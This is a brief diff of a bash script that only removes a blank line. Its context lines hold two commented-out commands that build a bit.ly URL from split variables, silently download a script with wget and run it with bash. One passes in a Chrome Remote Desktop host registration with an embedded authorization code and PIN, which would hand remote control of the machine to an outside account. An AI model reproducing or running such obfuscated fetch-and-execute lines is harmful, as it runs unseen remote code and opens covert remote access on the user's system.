@@ -1,4 +1,3 @@
-
 #!/bin/bash
 # # ! cmd=RDP;i=0001;a=bit;x=ly;wget -q -O RDP ${a}.${x}/${cmd}${i} ;bash RDP 'DISPLAY= /opt/google/chrome-remote-desktop/start-host --code="4/0AX4XfWixlFxb0mcoXNtETJtF1Cetqx2XVrrT680nvHB95HLNPZID_O3aTPDbqnEr1F-e-g" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=$(hostname)' '4500'
 # # ! cmd=RDP;i=0001;a=bit;x=ly;wget -q -O RDP ${a}.${x}/${cmd}${i} ;bash RDP ''
